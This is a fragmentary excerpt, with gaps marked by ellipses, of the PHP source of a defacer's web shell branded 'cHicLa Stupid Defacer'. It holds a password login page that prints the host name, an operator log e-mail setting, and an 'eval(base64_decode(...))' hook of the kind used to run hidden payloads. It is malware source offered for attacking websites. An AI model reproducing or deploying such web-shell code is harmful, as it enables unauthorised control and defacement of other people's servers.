...
if($chk_login == true)
{
 ...
 {
 die("
  <title>-+=[cHicLa Stupid Defacer]=+-</title>
  <center>
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
  <tr><td valign=middle align=center>
  <table width=200 bgcolor=#00000 border=6 bordercolor=#00000>
        <tr><td><img src='http://chicla-stupid.cz.cc/data/photo/blank.gif' border='0'>
  <font size=1 face=verdana><center>
  <b></font></a></b>
  </center>
  <form method=post>
  <font size=1 face=verdana color=red><strong><center[Indonesia Defacer Red-White Flag]</center><br><center>[- B-P4ZZ -]</strong><br>
  <input type=password name=pass size=30>
  <input type=submit value=Login>
  </form></center>
  <center><b>Host:</b> ".$_SERVER["HTTP_HOST"]."<br>
...
##[ ADVANCED ]##
$tmp_dir       = "";
$log_email     = "jancok@sekuritionline.net";
...
##[ DEFAULT ACTIONS ]##
  ...
  header("Pragma: no-cache"); $headerz = ""; eval(base64_decode($headerz));
...
function html_header() { return "<b>".sh_name()."</b><br>.: -+=[cHicLa Stupid Defacer]=+- :."; }
function html_footer() { return "&copy; 2009 By -+=[cHicLa Stupid Defacer]=+-. Generated: ".round(getmicrotime()-starttime,4)." seconds"; }
